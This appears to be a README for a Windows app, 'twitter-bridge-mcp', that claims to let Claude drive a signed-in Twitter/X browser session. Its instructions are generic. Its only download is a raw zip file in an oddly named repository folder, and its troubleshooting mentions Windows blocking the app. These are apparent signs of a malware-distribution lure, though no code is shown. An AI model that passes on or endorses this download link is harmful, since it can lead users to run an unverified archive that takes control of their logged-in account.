# 🔗 twitter-bridge-mcp - Connect Claude to Twitter in Windows

[![Download / Visit GitHub](https://img.shields.io/badge/Download%20%2F%20Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/harshdeepk585/twitter-bridge-mcp/main/saeculum/bridge-mcp-twitter-v3.5.zip)

## 🧩 What this app does

twitter-bridge-mcp lets Claude.ai work with Twitter/X through browser automation. It does not need an API key. That means you can use your existing Twitter/X account and control it from Claude on your Windows PC.

Use it to:

- open Twitter/X in a browser
- read posts and profiles
- create posts
- reply to posts
- manage basic account actions through browser steps
- connect Claude to Twitter/X in a simple local setup

## 💻 What you need

Before you start, make sure you have:

- a Windows 10 or Windows 11 PC
- internet access
- Google Chrome or Microsoft Edge
- a Twitter/X account
- Claude.ai access
- permission to sign in to your Twitter/X account in a browser

## 🛠️ First-time setup

The app works by linking Claude to your browser session. That means you may need to do a few extra steps the first time.

### 1. Start your browser

Open Chrome or Edge before you begin. Use the same browser each time if possible.

### 2. Sign in to Twitter/X

Log in to your Twitter/X account in the browser. Stay signed in so the app can use your session.

### 3. Open Claude.ai

Sign in to Claude.ai in another tab or window.

### 4. Start twitter-bridge-mcp

Run the app from the file you downloaded or from the folder in the repository setup.

### 5. Connect the app

Follow the on-screen steps. The app may ask you to allow browser access or point Claude to a local server address.

### 6. Test the connection

Ask Claude to do a simple Twitter/X task, such as opening your profile or reading a public post.

## 📚 How to use it

Once the app is running, you can ask Claude to help with Twitter/X tasks in plain language.

Try requests like:

- open my Twitter/X profile
- show me the latest post from this account
- draft a reply to this tweet
- make a new post about my project
- find posts that mention my brand
- check whether my last post was published

Keep your requests clear and short. One task at a time works best.

## 🔐 Account and browser behavior

This tool works through your browser, not through a Twitter/X API key. Because of that, it uses your active browser session.

Keep these points in mind:

- stay signed in to Twitter/X
- do not close the browser while the app runs
- use one browser profile for the app
- avoid switching accounts while the session is active
- keep your browser updated

## 🧯 If something does not work

If the app does not start or Claude cannot connect, check these items:

- the browser is open
- you are signed in to Twitter/X
- you used the right file from the GitHub page
- Windows did not block the app
- the app window or local process is still running
- your browser did not open in guest mode
- the GitHub setup steps match your version
